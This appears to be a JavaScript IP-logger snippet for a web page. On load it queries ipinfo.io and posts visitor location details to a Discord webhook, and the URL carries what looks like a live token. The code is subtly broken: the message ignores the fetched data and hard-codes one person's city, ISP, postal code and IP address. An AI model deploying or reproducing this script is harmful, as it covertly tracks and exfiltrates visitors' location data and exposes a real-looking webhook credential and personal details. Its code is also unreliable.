// Function to fetch IP address and location and send to Discord
async function getIPAndLocationAndSendToDiscord() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        
        // Construct the message as a single block wrapped in a code block
        const message = "\n" +
                        "City: Whittier\n" +
                        "Region: California\n" +
                        "Country: US\n" +
                        "Internet Provider: AS20115 Charter Communications\n" +
                        "Postal Code: 90602\n" +
                        "IP Address: 137.25.65.161\n" +
                        "\n";
        
        // Send the message to Discord using a webhook
        await sendToDiscord(message);
    } catch (error) {
        console.error('Error fetching IP and location:', error);
    }
}

// Function to send message to Discord using webhook
async function sendToDiscord(message) {
    const webhookURL = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL

    // Send the message to Discord
    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    });
}

// Call the function to get IP address, location, and send to Discord when the page loads
window.onload = getIPAndLocationAndSendToDiscord;
